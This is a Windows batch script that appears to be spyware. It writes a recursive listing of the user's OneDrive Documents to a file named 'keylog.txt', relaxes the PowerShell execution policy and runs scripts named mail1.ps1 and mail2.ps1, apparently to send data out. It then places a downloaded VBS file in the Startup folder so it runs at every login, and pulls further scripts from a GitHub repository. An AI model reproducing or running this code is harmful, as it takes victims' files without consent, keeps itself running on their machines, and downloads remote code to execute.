@echo off
cd/
cd %USERPROFILE%\OneDrive\Documents\
dir /s > keylog.txt
cls
powershell Set-ExecutionPolicy RemoteSigned
cls
powershell Get-ExecutionPolicy
cls
powershell c:/script\mail2.ps1
powershell c:/script\mail1.ps1
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
cls
WScript C:\script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/menu.vbs
cd c:/script/
WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail1.ps1
WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail2.ps1
WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/download.vbs
WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/start.bat
WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/go.bat
@echo off